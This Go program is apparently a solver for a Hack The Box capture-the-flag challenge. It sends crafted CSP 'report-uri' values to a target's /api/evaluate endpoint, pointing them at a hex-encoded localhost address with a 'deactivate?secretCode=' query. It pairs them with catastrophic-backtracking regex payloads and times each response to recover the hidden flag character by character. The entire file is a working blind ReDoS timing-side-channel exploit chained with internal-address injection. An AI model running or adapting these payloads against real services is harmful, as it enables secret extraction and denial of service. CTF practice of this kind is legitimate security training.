//usr/bin/env go run $0 $@; exit $?

package main

import (
	"bytes"
	"fmt"
	"os"
	"strings"
	"time"

	"net/http"
)

var httpClient = &http.Client{}
var host string

const CHARS = "_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

func postDuration(testPayload string) int64 {
	jsonData := []byte(testPayload)

	req, _ := http.NewRequest("POST", "http://"+host+"/api/evaluate", bytes.NewBuffer(jsonData))

	req.Header.Set("Content-Type", "application/json")

	t := time.Now()
	_, err := httpClient.Do(req)

	if err != nil {
		panic(err)
	}

	return time.Since(t).Milliseconds()
}

func joinFlags(frontflag, backflag string) {
	i := 1

	for ; strings.Index(frontflag, backflag[:i]) != -1; i++ {
	}

	i--

	if !strings.HasSuffix(frontflag, backflag[:i]) {
		fmt.Println("[*] Could not find a match between frontflag and backflag")
		fmt.Printf("[!] Possible flag: HTB{%s%s}\n", frontflag, backflag)
		fmt.Printf("[!] Possible flag: HTB{%s_%s}\n", frontflag, backflag)
		fmt.Printf("[!] Flag results: HTB{%s ...\n%s... %s}\n", frontflag, strings.Repeat(" ", 23+len(frontflag)), backflag)
	} else {
		fmt.Println("[*] Found a match between frontflag and backflag")
		index := strings.Index(frontflag, backflag[:i])
		flag := "HTB{" + frontflag[:index] + backflag + "}"
		fmt.Println("[!] Flag:", flag)
	}
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <ip:port>")
		os.Exit(1)
	}

	host = os.Args[1]

	frontflag, backflag := "", ""

	matched := true

	for matched {
		matched = false

		for _, c := range CHARS {
			testPayload := fmt.Sprintf(`{"csp": "report-uri http://0x7f000001:1337/deactivate?secretCode=^HTB\\{%s(((((((.)*)*)*)*)*)*)*!"}`, frontflag+string(c))

			if postDuration(testPayload) >= 2000 {
				frontflag += string(c)
				fmt.Printf("Frontflag: HTB{%s\r", frontflag)
				matched = true
				break
			}
		}

		if strings.HasSuffix(frontflag, "__") {
			frontflag = frontflag[:len(frontflag)-2]
			break
		}
	}

	fmt.Printf("[+] Frontflag: HTB{%s\n", frontflag)

	matched = true

	for matched {
		matched = false

		for _, c := range CHARS {
			testPayload := fmt.Sprintf(`{"csp": "report-uri http://0x7f000001:1337/deactivate?secretCode=^HTB\\{%s[^%s]%s\\}$"}`, strings.Repeat(".?", 50-len(backflag)), string(c), backflag)

			if postDuration(testPayload) >= 2000 {
				backflag = string(c) + backflag
				fmt.Printf("Backflag: %s}\r", backflag)
				matched = true
				break
			}
		}

		if strings.HasPrefix(backflag, "__") {
			backflag = backflag[2:]
			break
		}
	}

	fmt.Printf("[+] Backflag: %s}\n", backflag)

	joinFlags(frontflag, backflag)
}
